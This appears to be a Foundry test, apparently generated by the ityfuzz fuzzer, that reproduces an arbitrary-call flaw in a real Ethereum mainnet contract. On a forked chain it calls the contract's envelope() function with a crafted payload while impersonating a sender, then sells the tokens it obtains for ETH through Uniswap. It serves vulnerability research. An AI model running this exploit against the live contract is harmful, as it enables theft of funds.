// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x6B175474E89094C44Da98b954EedeAC495271d0F,0x9008D19f58AAbD9eD0D60971565AA8510560ab41,0xcD07a7695E3372aCD2B2077557DE93e667B92bd8 -c eth --onchain-block-number 16576929 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0xcd07a7695e3372acd2b2077557de93e667b92bd8" to 0x0000000000000000000000000000000000000000
================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] 0xcD07a7695E3372aCD2B2077557DE93e667B92bd8.envelope(((0x0000000000000000000000000000000000000000, 0, 0xe1e1e1e1c5d2e0e1e1fa1fe1f0f1f0f01fe2f04e)), 0x0000000000000000000000000000000000000000, (), (114896408284296150266781151555976538734788597369244059224678.3767 Ether), (0), 0)
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0xcD07a7695E3372aCD2B2077557DE93e667B92bd8 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()


 */

contract C6B17 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 16576929);
    }

    function test() public {
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        
        0xcD07a7695E3372aCD2B2077557DE93e667B92bd8.call(abi.encodeWithSignature(
            "envelope((address,uint256,bytes)[],address,address[],uint256[],int256[],uint256)",[[0x0000000000000000000000000000000000000000, 0, 0xe1e1e1e1c5d2e0e1e1fa1fe1f0f1f0f01fe2f04e]], 0x0000000000000000000000000000000000000000, [], [114896408284296150266781151555976538734788597369244059224678.3767 Ether], [0], 0
        )); 
        vm.startPrank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        uint256 amount0 = IERC20(0xcD07a7695E3372aCD2B2077557DE93e667B92bd8).balanceOf(address(this));
        IERC20(0xcD07a7695E3372aCD2B2077557DE93e667B92bd8).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xcD07a7695E3372aCD2B2077557DE93e667B92bd8;
        liq_path0[1] = address(weth);
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
